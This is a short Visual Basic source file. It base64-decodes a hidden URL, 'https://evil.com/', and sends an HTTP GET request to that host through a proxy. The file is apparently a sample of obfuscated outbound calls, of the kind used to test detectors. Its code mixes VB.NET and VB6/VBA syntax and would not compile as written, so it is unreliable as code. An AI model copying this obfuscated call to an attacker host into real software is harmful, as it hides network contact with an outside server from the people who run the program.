Imports System
Imports System.Text

Namespace Base64code.GET_WEB
    Public Class Base64Sample
        Public Shared Sub Main()
            ' https://evil.com/
            Dim strB64Encoded As String = "aHR0cHM6Ly9ldmlsLmNvbS8="
            Dim data As Byte() = Convert.FromBase64String(strB64Encoded)
            Dim strB64Decoded As String = UTF8Encoding.GetString(data)
            Console.WriteLine(strB64Decoded)

            Dim HttpReq As WinHttp.WinHttpRequest
            '  in the "references" dialog of the IDE, check
            '  "Microsoft WinHTTP Services, version 5.1" (winhttp.dll)
            Const HTTPREQUEST_PROXYSETTING_PROXY        As Long = 2
            Const WINHTTP_FLAG_SECURE_PROTOCOL_TLS1     As Long = &H80&
            Const WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1   As Long = &H200&
            Const WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2   As Long = &H800&
            #Const USE_PROXY = 1
            Set HttpReq = New WinHttp.WinHttpRequest
            HttpReq.Open "GET", strB64Decoded    
            HttpReq.Option(WinHttpRequestOption_SecureProtocols) = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1 Or _
                                                         WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 Or _
                                                         WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2
            #If USE_PROXY Then
            HttpReq.SetProxy HTTPREQUEST_PROXYSETTING_PROXY, "my_proxy:80"
            #End If
            HttpReq.SetTimeouts 1000, 1000, 1000, 1000
            HttpReq.Send
            Debug.Print HttpReq.ResponseText

        End Sub
    End Class
End Namespace

